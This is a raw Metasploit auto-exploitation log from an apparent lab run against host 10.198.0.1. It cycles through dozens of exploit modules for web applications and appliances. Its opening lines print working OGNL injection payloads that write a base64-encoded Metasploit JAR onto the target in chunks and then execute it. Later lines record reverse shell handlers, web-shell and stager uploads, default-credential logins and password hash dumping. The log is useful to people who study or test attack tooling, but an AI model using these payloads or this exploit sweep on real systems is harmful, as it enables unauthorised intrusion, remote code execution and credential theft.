[*] [2016.06.04-09:50:27] [0350] Attempting to execute: #f=new java.io.FileOutputStream('xwXSls.jar'+#a,true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('f7xd1RalyvV7Fd/CP6j4Nv6R7tLGQARhbk6Ly7c4Zn06bWzJS0Iq/gkfIu00Rduqly497oTqY1R8B//MCn43568p06klR1HxL/jeBFvWFHAAFd/HD8ih+m1zpUXpZEY+igYrlSLVuGL8FZ9FmDeFt3wz55TOr6NWbJPpMF9/QwiNH5vpzWZ6/PLvKv4D/6niv/Df5D95rE5wMPLPAcrMHhU7p+iJ6TmXXSblZwLOT02erSk16eOpyHO/DmuTmaJ0SDooyuppfnX1fJIp6pCi2o20QeyZaSKP85n1/6j4Ie5V8SPOCsW5UuQCq/Ai/JrgalXcJ4AqoCDkEhqxt8JwjHyTEq7bcwxRhu2nyraltt1M91LC9ardnIl39cnk+LUq+ASRzDzpedpyPMutsLy6OmsiANfcqNWfjlGoyN0Ur5Ha2topaGKUomsbOE93J2KGQ4I9Lfh5CKiCRMILMr6rCkFBUYUiQaVMzs/7PO3V2KyKGlUoFkrI42mXdiZZY3+h')),#f.close(),#a='7QI'
[*] [2016.06.04-09:50:27] [0350] Attempting to execute: #f=new java.io.FileOutputStream('xwXSls.jar'+#a,true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('yIucjp60NeCF8H4ztxPYuLaEUgoqoUyFx+EJFZ4CyoC+WrtHhVfgVYqi2g2JlAq/4SQi1piDxPNr8LoqTOMEWppvdSO2SYU34E1V0PBuVSiHx1RhOkMhMR0SZlBo19BqJss5i2WYMbUkdXdTCAm6MJuKkTBHFeYK83h1iCocKsynYBUOU4UFwuF8doQqHMmoFgpH8W2YSqpl16TIqyRhkSpUCJWqUCVUq/AoS1TCma/GNvvI7xyLCs7PXDmNxCDxx/WbeanpsXrNXHiNp7pm0j778bz8fNxqOSut/lR+BhsPo7a8U4n6lFaD8U4PF2xGpLTZlzTYcWaEGxoKggQMKoEpSo7VB9XhZEs7dwyOlasG5cTHGtN2fbTezkXzoo/tVfLbNTK/10nMKtzOcU/mjyUtmwQpIlrZjmQL6T5GAI7ZYfb2eZ1lIG4mKfbdhpWa2lKCrt9gW8l+h/KC00MWCBfu+fy9m+LcpB0enthOFYYOpM1ea/PkvjCbshYVymLc')),#f.close(),#a='7QI'
[+] [2016.06.04-09:50:27] Workspace:lab5 Progress:356/775 (45%) [352/770] 10.198.0.1:80 - F5 iControl iCall::Script Root Command Execution
[-] [2016.06.04-09:50:27] No reverse connect payloads available for exploit/linux/http/f5_icall_cmd
[-] [2016.06.04-09:50:27] No payloads were compatible with exploit/linux/http/f5_icall_cmd)
[-] [2016.06.04-09:50:27] [0352] Exploit failed: A payload has not been selected.
[*] [2016.06.04-09:50:27] [0350] Attempting to execute: #f=new java.io.FileOutputStream('xwXSls.jar'+#a,true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('UzYYKStF0Zn0WPGRhAhLC2A4SJxL/5+GcqLZp42fNaUccyM7oUwebJu0PYCWmsihNhvJfrOtmyGaCiIusvPt8/9zuF+4Yja0kTZTjmfZsvCURjfg2oyyruKmLLszcUALky9MC0/+onBznZUm5JXhg/1k4Fd5ylvTn3ISHIEKx0BuE5oQjtljdnNKcjGEcMEPp7wjUmDMpI+iCaSyh+T0RGpCOZ0ZPlBcMWhjOm2lc6BlE9K3yUHnt5OmSd9SYvg0Fk71Iqgt1TiYcCYwsNyykqbB3XdHVzt9HE6b8hFHyY4Iev0XwifCH//F5b3JlzttdifJ+rUeBlZYx5q1RKm8eQoXy3J1ssBD8oxEajN1CQgnFIiudQcZXtKAkXDcVouSCTl/aZ9X3KgadaTdrJrfGW+xHZMULHAFDx3AHD6LI378Nq9asu7s/g12NqXKpEfu3GxO3YU+4paT4cLrlrPFSijaUuMNIMLsnD9MaQ5Zqm4r7RWNI/9Hxs/ZVGH8OQcq')),#f.close(),#a='7QI'
[*] [2016.06.04-09:50:27] [0350] Attempting to execute: #f=new java.io.FileOutputStream('xwXSls.jar'+#a,true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('xE2T+9tA2J0CRozrE9ksnwmvjVzmJeSJTd+sPOedEHuFP18LR2RRjAqm4zaGNn8xm4Pehlt1z8lZV2RDv/trBGmB9k0uwz76YKcCnCVVoKtzCSwOT9BozocO2H65j+onIx1v5ZYdkFyDlUxmjcU4JObfzclBXq3sTyYprxbFze5EymzwvuaaCgUaidf88Z1mQWOraSrkyc051NOn/lLj6jtlDjSlKOumYlO6j/HG/QBJlRHkVfr8IHA9yBxM2A7RFvv67R4Oi1xrRUWhx7BbKGPnLB0wL+g3kvakpJ8Lakr6ou3+buLrs/rcD88spoYeg7BhAzXs4YZCXQ53ixySlAt7qQTVO1Mq3n4xq/5HCzAJpZRIxc1BLqEcMU0cUU0HKKWOxXy6H28MvWgd8Tu3ML+5riyQNFMbuQoGYvzU8ag0cAA0udTKxvvqZotaEY6FxtZTm5uiq/b/YJh367HRbA2Y6QbDzmt48mEKcA+HgQiPAIAfZnObTKvZ3Bi7M30N')),#f.close(),#a='7QI'
[*] [2016.06.04-09:50:27] [0350] Attempting to execute: #f=new java.io.FileOutputStream('xwXSls.jar'+#a,true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('uPOT2fkp91wB5N+eaPw57abRjPy+YgRwt/v7dxB+Ab8Ega/FLRAgEBDPGQOhawR8zeUgtoyBn9aBqgxIZTVltRmQMxDUFBoyUNRapakZKI6IurgHSip1MQMlPJRWamUZmBbx6/49cJ6maeWjMD0S0AMZCHWOwYyuLFY+mMn4Znn4RkCPSLqUgdkulC7p/hGYE5GrdL8uj8JcF+28zkrtEJ3YODQD82l9mLYgA4ePwhF1AbpgslIocAOeSzehgBgfhSMzsLAzx4TMLycyIU9lIuiSD2pHMXnF21TzukgvykA4A4s6q6r1IpelCq2S6GukoeptMLNKq3HBGUyrpScuzNFIIHv49pjx28Xe7Rgc26UrI7AkolbqKiM7Tiet1o3C8dK9sLTLp50wCpFol6gti3b5dWJxZrTLNUg0AydGivXiDJxEOuf5ZJqnwymjUE9PZ3T59CJ651Ljpwq904PRSImvrjRUqpfctwOO89WVhcrKlB1wpF4SKl1MutkGgSGY')),#f.close(),#a='7QI'
[*] [2016.06.04-09:50:27] [0350] Attempting to execute: #f=new java.io.FileOutputStream('xwXSls.jar'+#a,true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('md0tnw4NhG1rGQ7te3FrKY2PDgkn69IeuNqzEGtLHobG62B1OczQVor3wqldvmFYRcw16TJtT+Pt6bRt7hyCBZEgyRXw5GplodqYM1eUDLQThBIJsoxrCEx0wbzLTpeG5lmPxzAvhnC4UotqHVkHkCu1tazpSJDM4i6UkLwdyobhjEjRMHRG1CF4QFf2wGW6op3pGmz2GHSR+snnztLWZeDsETgnUjQEawnAs+hJY3Cua5/1GTgvUqwZo7BBi3lilkOcxURPSr3YFZLtYDKOaXkvuyNFY7CR3K2HeThJD+6B8jFIkFuF5BE4P1I8xJxs6uJdMlKil2Sgl0xLU4rxWeR4NPWRi3i+xGbfAx3aBcxNOpDlxiaFloNDGi2HpS5nAY8z1w1U1rTL4/3QT/+YjG/x/WAT8hKRFk5EHYPNubjQBigeKrVB17290NC2jMCFHncXkW0ipa736KXkSOV6Ka3o4uKo6yxvj4FIWD6pF+nE8yXMs146Ap/aDYJwvNAl')),#f.close(),#a='7QI'
[+] [2016.06.04-09:50:28] Workspace:lab5 Progress:357/775 (46%) [353/770] 10.198.0.1:8080 - Gitlab-shell Code Execution
[*] [2016.06.04-09:50:28] [0350] Attempting to execute: #f=new java.io.FileOutputStream('xwXSls.jar'+#a,true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('nA0tNF8kXAKrKQ09S/9Fyk2rKWM9B897CQnW0plEc1NFjqVLmSWPF8o7rRw6VRw54rQyuEeO+Kt1fwY+3VUXEG6EMl3U/b4QpZjLhva9xWmpzst5TCxAJH4FL4DGv1Vlyb1PxIpofmUMLu+qHIGtEf8YXEF0r+SkNAZX0fIzGfjsGFxNOrqmi82rfY7M67sXPj8CX+Bg+GJErn4YTmA2vlQXDAWJKYWSF+XLL1dUoK74QkF23q90RYivr+4H277v+SGYk5PyayRhtSclmdfLm1+nsAho38hZ+vI8S3/TDbVg1tR+uqliS4vZkNM4DY/BNtbUdRn41m63BjxOFeLaSZp/CV7OVoqzSCUCza3YPAzXb4N5WdaGYTtnyhs85ipG4cbmyocn396Uf7sHZDLYzF20+/YuV/0K/zqVpVNJVJibQ7MYKugpBfo2kLUdQ+DXsrbOPXwFXs0+XExMizQvJLzfacFWitWd20DnnFRVSaQotbaSCndeB35src69fw1e')),#f.close(),#a='7QI'
[*] [2016.06.04-09:50:28] [0353] Started reverse TCP handler on 0.0.0.0:1238
[*] [2016.06.04-09:50:28] [0350] Attempting to execute: #f=new java.io.FileOutputStream('xwXSls.jar'+#a,true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('z76/i14HaL5tDG4mwrc0E56hlsoqH+W8Wzs5CqrExcPwXfJ3xvO9bdBA08URUfs+e9IPOEnue0u7LbuZS4z+0L8DVGaAqqu+iw5u52zmFsVbO4f23TMGu4jS7ojoq/OH/PxgBxwR8os7QdXFYRjOwB2dulgZIp+4MwM/6tzqpzB6wc2yhCLDSLNivAFvemJgkMSQ6exDen9iRVntHKrPZWfzeDq2VJRFMjBy8rwb4EpXp5fOE8+rEyt8IUI32kKqvosdPFfeg/TqbtJ1i+4PiUvm3ARKSBTPIyOExDoxx3uANlKIyjJFfJgAJQYs4YUYXzLnRloG3FOWZatE/D/Hvps5fQhWE70xkvWUCqJ+D72qq5hDkt5LDM1hQu4yJPp3QilzyAejQyBWtFQQb2OUnQlHMRmkhd+fdbrfLQ3k52JF1FOLDL/d3+jUu84LcJx23yj8eBjuz8ADd8CD2kO0uwN+ov10GB4ku90B1w/Tbo+7bNQedm+3e0kC/gtQSwME')),#f.close(),#a='7QI'
[*] [2016.06.04-09:50:28] [0350] Attempting to execute: #f=new java.io.FileOutputStream('xwXSls.jar'+#a,true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('FAAAAAAAWk7ESAAAAAAAAAAAAAAAAAkAAABNRVRBLUlORi9QSwMEFAAAAAgAWk7ESH6aFUZiAAAAkQAAABQAAABNRVRBLUlORi9NQU5JRkVTVC5NRvNNzMtMSy0u0Q1LLSrOzM+zUjDUM+Dl8k3MzNN1zkksLrZSyE0tSSwuyMnPLNELSKzMyU9M4eUKSC3KzSwGaQAqSMzJ0S1ACPBy8XL5JeamouhMSSzBJq4PNVEvGWQXSAUAUEsBAhQAFAAAAAgAWk7ESOMAMqwjAAAAJAAAAA4AAAAAAAAAAAAAAAAAAAAAAG1ldGFzcGxvaXQuZGF0UEsBAhQAFAAAAAAAWk7ESAAAAAAAAAAAAAAAAAsAAAAAAAAAAAAAAAAATwAAAG1ldGFzcGxvaXQvUEsBAhQAFAAAAAgAWk7ESHB7Ld9OEQAAQSEAABgAAAAAAAAAAAAAAAAAeAAAAG1ldGFzcGxvaXQvUGF5bG9hZC5jbGFzc1BLAQIUABQAAAAAAFpO')),#f.close(),#a='7QI'
[-] [2016.06.04-09:50:28] [0353] Exploit aborted due to failure: no-access: 10.198.0.1:8080 - Login failed
[*] [2016.06.04-09:50:28] [0350] Attempting to execute: #f=new java.io.FileOutputStream('xwXSls.jar'+#a,true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('xEgAAAAAAAAAAAAAAAAJAAAAAAAAAAAAAAAAAPwRAABNRVRBLUlORi9QSwECFAAUAAAACABaTsRIfpoVRmIAAACRAAAAFAAAAAAAAAAAAAAAAAAjEgAATUVUQS1JTkYvTUFOSUZFU1QuTUZQSwUGAAAAAAUABQA0AQAAtxIAAAAA')),#f.close(),#a='7QI'
[*] [2016.06.04-09:50:28] [0350] Attempting to execute: #q=@java.lang.Class@forName('ognl.OgnlRuntime').getDeclaredField('_jdkChecked'),#q.setAccessible(true),#q.set(null,true),#q=@java.lang.Class@forName('ognl.OgnlRuntime').getDeclaredField('_jdk15'),#q.setAccessible(true),#q.set(null,false),#cl=new java.net.URLClassLoader(new java.net.URL[]{new java.io.File('xwXSls.jar'+#a).toURI().toURL()}),#a='2PHV',#c=#cl.loadClass('metasploit.Payload'),#c.getMethod('main',new java.lang.Class[]{@java.lang.Class@forName('[Ljava.lang.String;')}).invoke(null,new java.lang.Object[]{new java.lang.String[0]})
[+] [2016.06.04-09:50:28] Workspace:lab5 Progress:358/775 (46%) [354/770] 10.198.0.1:80 - Atlassian HipChat for Jira Plugin Velocity Template Injection
[*] [2016.06.04-09:50:28] [0354] Started reverse TCP handler on 0.0.0.0:1239
[-] [2016.06.04-09:50:28] [0354] 10.198.0.1:80 - Exploit aborted due to failure: bad-config: Jira username and password are required.
[+] [2016.06.04-09:50:29] Workspace:lab5 Progress:359/775 (46%) [355/770] 10.198.0.1:8080 - Graphite Web Unsafe Pickle Handling
[-] [2016.06.04-09:50:29] No reverse connect payloads available for exploit/unix/webapp/graphite_pickle_exec
[-] [2016.06.04-09:50:29] No payloads were compatible with exploit/unix/webapp/graphite_pickle_exec)
[-] [2016.06.04-09:50:29] [0355] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:50:29] Workspace:lab5 Progress:360/775 (46%) [356/770] 10.198.0.1:8080 - Zabbix 2.0.8 SQL Injection and Remote Code Execution
[-] [2016.06.04-09:50:29] No reverse connect payloads available for exploit/linux/http/zabbix_sqli
[-] [2016.06.04-09:50:29] No payloads were compatible with exploit/linux/http/zabbix_sqli)
[-] [2016.06.04-09:50:29] [0356] Exploit failed: A payload has not been selected.
[*] [2016.06.04-09:50:29] [0356] Cleaning script remnants
[!] [2016.06.04-09:50:30] [0356] Unable to remove script
[+] [2016.06.04-09:50:30] Workspace:lab5 Progress:361/775 (46%) [357/770] 10.198.0.1:80 - Kaseya VSA uploader.aspx Arbitrary File Upload
[*] [2016.06.04-09:50:30] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:50:30] [0357] Started reverse TCP handler on 0.0.0.0:1240
[!] [2016.06.04-09:50:31] [0350] This exploit may require manual cleanup of 'xwXSls.jarnull' on the target
[!] [2016.06.04-09:50:31] [0350] This exploit may require manual cleanup of 'xwXSls.jar7QI' on the target
[-] [2016.06.04-09:50:31] [0357] Exploit aborted due to failure: no-access: 10.198.0.1:80 - Failed to create a valid session
[+] [2016.06.04-09:50:31] Workspace:lab5 Progress:362/775 (46%) [358/770] 10.198.0.1:80 - vBulletin 5.1.2 Unserialize Code Execution
[*] [2016.06.04-09:50:32] [0358] Started reverse TCP handler on 0.0.0.0:1241
[*] [2016.06.04-09:50:32] [0358] Trying to inferprint the instance...
[-] [2016.06.04-09:50:32] [0358] Exploit aborted due to failure: no-target: 10.198.0.1:80 - Failed to detect a vulnerable instance
[+] [2016.06.04-09:50:32] Workspace:lab5 Progress:363/775 (46%) [359/770] 10.198.0.1:8080 - GE Proficy CIMPLICITY gefebt.exe Remote Code Execution
[*] [2016.06.04-09:50:32] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[+] [2016.06.04-09:50:32] Workspace:lab5 Progress:364/775 (46%) [360/770] 10.198.0.1:8080 - Horde Framework Unserialize PHP Code Execution
[*] [2016.06.04-09:50:32] [0359] Started reverse TCP handler on 0.0.0.0:1242
[*] [2016.06.04-09:50:32] [0360] Started reverse TCP handler on 0.0.0.0:1244
[*] [2016.06.04-09:50:32] [0360] Testing injection...
[-] [2016.06.04-09:50:32] [0359] Exploit aborted due to failure: bad-config: Using WebDAV requires SRVPORT=80 and URIPATH=/
[-] [2016.06.04-09:50:32] [0360] Exploit aborted due to failure: not-vulnerable: 10.198.0.1:8080 - Target isn't vulnerable, exiting...
[+] [2016.06.04-09:50:33] Workspace:lab5 Progress:365/775 (47%) [361/770] 10.198.0.1:8080 - Oracle Event Processing FileUploadServlet Arbitrary File Upload
[*] [2016.06.04-09:50:33] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:50:33] [0361] Started reverse TCP handler on 0.0.0.0:1245
[*] [2016.06.04-09:50:33] [0361] Generating payload and mof file...
[+] [2016.06.04-09:50:34] Workspace:lab5 Progress:366/775 (47%) [362/770] 10.198.0.1:8080 - LotusCMS 3.0 eval() Remote Command Execution
[*] [2016.06.04-09:50:34] [0361] Uploading the exe payload dWSfou.exe...
[*] [2016.06.04-09:50:34] [0362] Started reverse TCP handler on 0.0.0.0:1246
[-] [2016.06.04-09:50:34] [0361] Unexpected answer, trying anyway...
[*] [2016.06.04-09:50:34] [0361] Uploading the MOF file UvqbLoEB.mof
[-] [2016.06.04-09:50:34] [0362] Unable to get the page parameter, please reconfigure URI
[+] [2016.06.04-09:50:37] Workspace:lab5 Progress:367/775 (47%) [363/770] 10.198.0.1:8080 - F5 iControl Remote Root Command Execution
[-] [2016.06.04-09:50:37] No reverse connect payloads available for exploit/linux/http/f5_icontrol_exec
[-] [2016.06.04-09:50:37] No payloads were compatible with exploit/linux/http/f5_icontrol_exec)
[-] [2016.06.04-09:50:37] [0363] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:50:38] Workspace:lab5 Progress:368/775 (47%) [364/770] 10.198.0.1:80 - Joomla Content History SQLi Remote Code Execution
[*] [2016.06.04-09:50:38] [0364] Started reverse TCP handler on 0.0.0.0:1247
[-] [2016.06.04-09:50:38] [0364] Exploit aborted due to failure: unknown: 10.198.0.1:80 - Error retrieving table prefix
[+] [2016.06.04-09:50:38] Workspace:lab5 Progress:369/775 (47%) [365/770] 10.198.0.1:8080 - Spreecommerce 0.60.1 Arbitrary Command Execution
[-] [2016.06.04-09:50:38] No reverse connect payloads available for exploit/multi/http/spree_search_exec
[-] [2016.06.04-09:50:38] No payloads were compatible with exploit/multi/http/spree_search_exec)
[-] [2016.06.04-09:50:38] [0365] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:50:39] Workspace:lab5 Progress:370/775 (47%) [366/770] 10.198.0.1:80 - ManageEngine Desktop Central 9 FileUploadServlet ConnectionId Vulnerability
[*] [2016.06.04-09:50:39] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:50:39] [0366] Started reverse TCP handler on 0.0.0.0:1248
[*] [2016.06.04-09:50:39] [0366] Creating JSP stager
[*] [2016.06.04-09:50:40] [0366] Uploading JSP stager DyiBw.jsp...
[-] [2016.06.04-09:50:40] [0366] Exploit aborted due to failure: unknown: The server returned 302, but 200 was expected.
[!] [2016.06.04-09:50:40] [0366] This exploit may require manual cleanup of '../webapps/DesktopCentral/jspf/DyiBw.jsp' on the target
[+] [2016.06.04-09:50:41] Workspace:lab5 Progress:371/775 (47%) [367/770] 10.198.0.1:8080 - myBB 1.6.4 Backdoor Arbitrary Command Execution
[*] [2016.06.04-09:50:41] [0367] Started reverse TCP handler on 0.0.0.0:1249
[*] [2016.06.04-09:50:41] [0367] Sending exploit request
[-] [2016.06.04-09:50:41] [0367] Cannot connect to /index.php on 10.198.0.1, got 404.
[+] [2016.06.04-09:50:44] Workspace:lab5 Progress:372/775 (48%) [368/770] 10.198.0.1:8080 - Traq admincp/common.php Remote Code Execution
[*] [2016.06.04-09:50:44] [0368] Started reverse TCP handler on 0.0.0.0:1250
[+] [2016.06.04-09:50:47] Workspace:lab5 Progress:373/775 (48%) [369/770] 10.198.0.1:8080 - Gitorious Arbitrary Command Execution
[-] [2016.06.04-09:50:47] No reverse connect payloads available for exploit/multi/http/gitorious_graph
[-] [2016.06.04-09:50:47] No payloads were compatible with exploit/multi/http/gitorious_graph)
[-] [2016.06.04-09:50:47] [0369] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:50:47] Workspace:lab5 Progress:374/775 (48%) [370/770] 10.198.0.1:8080 - vBSEO proc_deutf() Remote PHP Code Injection
[*] [2016.06.04-09:50:48] [0370] Started reverse TCP handler on 0.0.0.0:1251
[*] [2016.06.04-09:50:48] [0370] Server replied with 404
[+] [2016.06.04-09:50:50] Workspace:lab5 Progress:375/775 (48%) [371/770] 10.198.0.1:80 - Joomla HTTP Header Unauthenticated Remote Code Execution
[*] [2016.06.04-09:50:50] [0371] Started reverse TCP handler on 0.0.0.0:1252
[-] [2016.06.04-09:50:50] [0371] 10.198.0.1:80 - Unable to determine the PHP version.
[*] [2016.06.04-09:50:50] [0371] 10.198.0.1:80 - Sending payload ...
[+] [2016.06.04-09:50:53] Workspace:lab5 Progress:376/775 (48%) [372/770] 10.198.0.1:8080 - Dolibarr ERP/CRM Post-Auth OS Command Injection
[-] [2016.06.04-09:50:53] No reverse connect payloads available for exploit/linux/http/dolibarr_cmd_exec
[-] [2016.06.04-09:50:53] No payloads were compatible with exploit/linux/http/dolibarr_cmd_exec)
[-] [2016.06.04-09:50:53] [0372] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:50:53] Workspace:lab5 Progress:377/775 (48%) [373/770] 10.198.0.1:8080 - PHP Volunteer Management System v1.0.2 Arbitrary File Upload Vulnerability
[*] [2016.06.04-09:50:54] [0373] Started reverse TCP handler on 0.0.0.0:1253
[-] [2016.06.04-09:50:54] [0373] Login failed with "admin:volunteer"
[+] [2016.06.04-09:50:56] Workspace:lab5 Progress:378/775 (48%) [374/770] 10.198.0.1:80 - Advantech WebAccess Dashboard Viewer Arbitrary File Upload
[*] [2016.06.04-09:50:56] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:50:57] [0374] Started reverse TCP handler on 0.0.0.0:1254
[*] [2016.06.04-09:50:57] [0374] 10.198.0.1:80 - Cannot reliably check exploitability.
[+] [2016.06.04-09:51:52] Workspace:lab5 Progress:379/775 (48%) [375/770] 10.198.0.1:80 - NETGEAR ProSafe Network Management System 300 Arbitrary File Upload
[*] [2016.06.04-09:51:52] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:51:52] [0375] Started reverse TCP handler on 0.0.0.0:1255
[*] [2016.06.04-09:51:53] [0375] 10.198.0.1:80 - Uploading payload...
[-] [2016.06.04-09:51:53] [0375] Exploit aborted due to failure: unknown: 10.198.0.1:80 - Payload upload failed
[+] [2016.06.04-09:51:54] Workspace:lab5 Progress:380/775 (49%) [376/770] 10.198.0.1:80 - Novell ServiceDesk Authenticated File Upload
[*] [2016.06.04-09:51:54] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:51:54] [0376] Started reverse TCP handler on 0.0.0.0:1256
[-] [2016.06.04-09:51:55] [0376] Exploit aborted due to failure: no-access: 10.198.0.1:80 - Failed to get the login URL.
[+] [2016.06.04-09:51:55] Workspace:lab5 Progress:381/775 (49%) [377/770] 10.198.0.1:8080 - WordPress Asset-Manager PHP File Upload Vulnerability
[*] [2016.06.04-09:51:55] [0377] Started reverse TCP handler on 0.0.0.0:1257
[*] [2016.06.04-09:51:55] [0377] Uploading payload nvgFq.php
[-] [2016.06.04-09:51:55] [0377] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:8080 - Upload failed
[+] [2016.06.04-09:51:56] Workspace:lab5 Progress:382/775 (49%) [378/770] 10.198.0.1:80 - ATutor 2.2.1 SQL Injection / Remote Code Execution
[*] [2016.06.04-09:51:56] [0378] Started reverse TCP handler on 0.0.0.0:1258
[*] [2016.06.04-09:51:56] [0378] 10.198.0.1:80 - Dumping the username and password hash...
[+] [2016.06.04-09:51:58] [0378] 10.198.0.1:80 - Got the 's hash:  !
[-] [2016.06.04-09:51:58] [0378] 10.198.0.1:80 - Exploit failed: TypeError no implicit conversion of nil into String
[+] [2016.06.04-09:51:58] Workspace:lab5 Progress:383/775 (49%) [379/770] 10.198.0.1:80 - Apache Struts Dynamic Method Invocation Remote Code Execution
[!] [2016.06.04-09:51:58] [0379] ******************************************************************************************
[!] [2016.06.04-09:51:58] [0379] *                  The module linux/http/struts_dmi_exec is deprecated!                  *
[!] [2016.06.04-09:51:58] [0379] *                       It will be removed on or about 2016-06-01                        *
[!] [2016.06.04-09:51:58] [0379] *                     Use exploit/multi/http/struts_dmi_exec instead                     *
[!] [2016.06.04-09:51:58] [0379] ******************************************************************************************
[!] [2016.06.04-09:51:58] [0379] ******************************************************************************************
[!] [2016.06.04-09:51:58] [0379] *                  The module linux/http/struts_dmi_exec is deprecated!                  *
[!] [2016.06.04-09:51:58] [0379] *                       It will be removed on or about 2016-06-01                        *
[!] [2016.06.04-09:51:58] [0379] *                     Use exploit/multi/http/struts_dmi_exec instead                     *
[!] [2016.06.04-09:51:58] [0379] ******************************************************************************************
[*] [2016.06.04-09:51:58] [0379] Started reverse TCP handler on 0.0.0.0:1259
[*] [2016.06.04-09:51:58] [0379] 10.198.0.1:80 - Uploading exploit to /tmp/NhJbQ
[*] [2016.06.04-09:51:59] [0379] 10.198.0.1:80 - Attempting to execute the payload...
[+] [2016.06.04-09:52:02] Workspace:lab5 Progress:384/775 (49%) [380/770] 10.198.0.1:8080 - WordPress WP-Property PHP File Upload Vulnerability
[*] [2016.06.04-09:52:02] [0380] Started reverse TCP handler on 0.0.0.0:1260
[*] [2016.06.04-09:52:02] [0380] Uploading payload WABDL.php
[-] [2016.06.04-09:52:02] [0380] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:8080 - Upload failed
[+] [2016.06.04-09:52:02] Workspace:lab5 Progress:385/775 (49%) [381/770] 10.198.0.1:80 - Apache Struts Dynamic Method Invocation Remote Code Execution
[*] [2016.06.04-09:52:02] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:52:03] [0381] Started reverse TCP handler on 0.0.0.0:1261
[*] [2016.06.04-09:52:03] [0381] 10.198.0.1:80 - Uploading exploit to LH4hA.jar, and executing it.
[+] [2016.06.04-09:54:57] Workspace:lab5 Progress:386/775 (49%) [382/770] 10.198.0.1:8080 - qdPM v7 Arbitrary PHP File Upload Vulnerability
[+] [2016.06.04-09:54:58] Workspace:lab5 Progress:387/775 (49%) [383/770] 10.198.0.1:8080 - Network Shutdown Module (sort_values) Remote PHP Code Injection
[*] [2016.06.04-09:54:58] [0383] Started reverse TCP handler on 0.0.0.0:1263
[*] [2016.06.04-09:54:58] [0383] 10.198.0.1:8080 - Sending payload
[+] [2016.06.04-09:55:01] Workspace:lab5 Progress:388/775 (50%) [384/770] 10.198.0.1:80 - Basilic 1.5.14 diff.php Arbitrary Command Execution
[-] [2016.06.04-09:55:01] No reverse connect payloads available for exploit/unix/webapp/basilic_diff_exec
[-] [2016.06.04-09:55:01] No payloads were compatible with exploit/unix/webapp/basilic_diff_exec)
[-] [2016.06.04-09:55:01] [0384] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:55:01] Workspace:lab5 Progress:389/775 (50%) [385/770] 10.198.0.1:80 - Umbraco CMS Remote Command Execution
[*] [2016.06.04-09:55:01] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:55:02] [0385] Started reverse TCP handler on 0.0.0.0:1264
[*] [2016.06.04-09:55:03] [0385] Uploading 47446 bytes through /umbraco/webservices/codeEditorSave.asmx...
[*] [2016.06.04-09:55:03] [0385] Uploading to /umbraco/ylHWwFDfZb.aspx
[*] [2016.06.04-09:55:03] [0385] Didn't get the expected 500 error code /umbraco/webservices/codeEditorSave.asmx [500 OK]. Trying to execute the payload anyway
[*] [2016.06.04-09:55:03] [0385] Executing /umbraco/ylHWwFDfZb.aspx...
[*] [2016.06.04-09:55:03] [0385] Writing 47446 bytes through /umbraco/webservices/codeEditorSave.asmx...
[*] [2016.06.04-09:55:03] [0385] Wrting over /umbraco/ylHWwFDfZb.aspx
[*] [2016.06.04-09:55:03] [0385] Didn't get the code and message /umbraco/webservices/codeEditorSave.asmx [500 OK]
[+] [2016.06.04-09:55:05] Workspace:lab5 Progress:390/775 (50%) [386/770] 10.198.0.1:8080 - Nagios XI Network Monitor Graph Explorer Component Command Injection
[-] [2016.06.04-09:55:05] No reverse connect payloads available for exploit/unix/webapp/nagios_graph_explorer
[-] [2016.06.04-09:55:05] No payloads were compatible with exploit/unix/webapp/nagios_graph_explorer)
[+] [2016.06.04-09:55:05] Workspace:lab5 Progress:391/775 (50%) [387/770] 10.198.0.1:8080 - Wordpress Front-end Editor File Upload
[*] [2016.06.04-09:55:05] [0387] Started reverse TCP handler on 0.0.0.0:1265
[*] [2016.06.04-09:55:05] [0387] Trying to upload payload
[*] [2016.06.04-09:55:05] [0387] Uploading payload
[-] [2016.06.04-09:55:05] [0387] Exploit aborted due to failure: unknown: 10.198.0.1:8080 - Unexpected response, exploit probably failed!
[+] [2016.06.04-09:55:06] Workspace:lab5 Progress:392/775 (50%) [388/770] 10.198.0.1:80 - Sflog! CMS 1.0 Arbitrary File Upload Vulnerability
[*] [2016.06.04-09:55:06] [0388] Started reverse TCP handler on 0.0.0.0:1266
[*] [2016.06.04-09:55:06] [0388] Attempt to login as 'admin:secret'
[-] [2016.06.04-09:55:06] [0388] Unable to login
[+] [2016.06.04-09:55:09] Workspace:lab5 Progress:393/775 (50%) [389/770] 10.198.0.1:80 - WebPageTest Arbitrary PHP File Upload
[*] [2016.06.04-09:55:09] [0389] Started reverse TCP handler on 0.0.0.0:1267
[*] [2016.06.04-09:55:09] [0389] Uploading payload (1285 bytes)...
[*] [2016.06.04-09:55:09] [0389] Requesting /www/results/blah.php
[+] [2016.06.04-09:55:12] Workspace:lab5 Progress:394/775 (50%) [390/770] 10.198.0.1:80 - EGallery PHP File Upload Vulnerability
[*] [2016.06.04-09:55:12] [0390] Started reverse TCP handler on 0.0.0.0:1268
[*] [2016.06.04-09:55:12] [0390] Sending PHP payload (KiiusXCJ.php)
[-] [2016.06.04-09:55:12] [0390] File wasn't uploaded, aborting!
